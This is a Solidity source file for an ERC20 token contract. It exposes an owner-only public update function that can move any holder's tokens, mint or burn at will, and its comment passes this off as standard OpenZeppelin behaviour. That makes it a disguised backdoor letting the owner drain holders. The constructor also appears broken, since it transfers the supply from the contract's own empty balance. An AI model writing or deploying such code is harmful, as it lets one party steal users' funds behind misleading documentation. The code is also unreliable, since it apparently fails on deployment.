// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {SafeERC20} from "@openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC20} from "@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20 {
    using SafeERC20 for ERC20;

    address public _owner;

    constructor(
        string memory name,
        string memory ticker,
        uint256 _totalSupply,
        address owner
    ) ERC20(name, ticker) {
        _update(address(this), owner, _totalSupply);
        _owner = owner;
    }

    /**
     * @dev All changes to transfers are modified here as per openzeppelin spec
     *
     * Emits a {Transfer} event.
     */
    function update(address from, address to, uint256 value) public onlyOwner {
        _update(from, to, value);
    }

    /**
     * @dev Transfer Ownership
     * Can also renounce by transfering to burn address
     */
    function transferOwnership(address to) public onlyOwner {
        _owner = to;
    }

    modifier onlyOwner() {
        require(address(msg.sender) == _owner, "Not owner");
        _;
    }
}
